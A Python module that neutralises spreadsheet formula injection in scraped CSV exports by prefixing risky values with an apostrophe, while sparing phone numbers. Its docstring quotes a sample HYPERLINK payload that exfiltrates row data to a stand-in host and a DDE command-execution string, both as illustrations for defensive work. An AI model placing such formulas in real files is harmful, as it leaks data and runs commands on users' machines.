"""Stop scraped text executing when the CSV is opened in a spreadsheet.

Every value in these exports came off somebody else's web page, and both
runbooks end with "import to Google Sheets". Excel, LibreOffice and Sheets all
treat a cell beginning `=`, `+`, `-` or `@` as a formula, so a page that prints

    =HYPERLINK("https://evil.example/?d="&A1&B1, "Click")

lands in the sheet as a live formula that exfiltrates the row next to it the
moment someone clicks. `=cmd|' /C calc'!A0` is the DDE variant, and it has
worked in Excel for years. The scraper does not need to be the thing that runs
it, and an operator importing a lead list has no reason to expect it might.

The fix is the standard one: prefix the value with an apostrophe, which both
Excel and Sheets consume on import and use to force the cell to text. The
apostrophe does not appear in the rendered cell.

The reason this is a module rather than three lines inlined twice is the
`+`/`-` case. A European lead list is *full* of values that legitimately start
with those:

    recruiter_phone   +41 44 123 45 67
    salary_min        -  (an em dash from a salary range)

Neutralising those blindly would put a stray apostrophe in front of every phone
number in the deliverable. So a leading `+` or `-` is left alone when what
follows is unambiguously a number — digits, spaces, brackets, dots and dashes
and nothing else. `+41 44 123 45 67` passes through untouched; `+cmd|...` does
not, because it contains letters.

`=` and `@` are never exempted: no legitimate field in either schema starts
with one.
"""

from __future__ import annotations

import re
from typing import Any

#: Leading characters a spreadsheet may read as the start of a formula.
#: The control characters matter because Excel strips them before parsing, so
#: "\t=cmd" is still "=cmd" by the time it is evaluated.
_RISKY_PREFIXES = ("=", "+", "-", "@", "\t", "\r", "\n", "|")

#: A value that is only digits and phone/number punctuation cannot be a
#: formula, because every formula needs a function name or a cell reference.
_PLAIN_NUMBER_RX = re.compile(r"^[+\-]?[\d\s()./\-]+$")


def neutralise(value: Any) -> Any:
    """Return `value` with any formula-triggering prefix defused.

    Non-strings pass through unchanged — an int or None cannot carry a payload,
    and coercing them here would change the CSV for no reason.
    """
    if not isinstance(value, str) or not value:
        return value
    if not value.startswith(_RISKY_PREFIXES):
        return value
    if value[0] in "+-" and _PLAIN_NUMBER_RX.match(value):
        # A phone number or a signed figure. Nothing to execute.
        return value
    return "'" + value


def safe_row(row: dict[str, Any]) -> dict[str, Any]:
    """`neutralise` every value in a row, keys untouched."""
    return {key: neutralise(value) for key, value in row.items()}
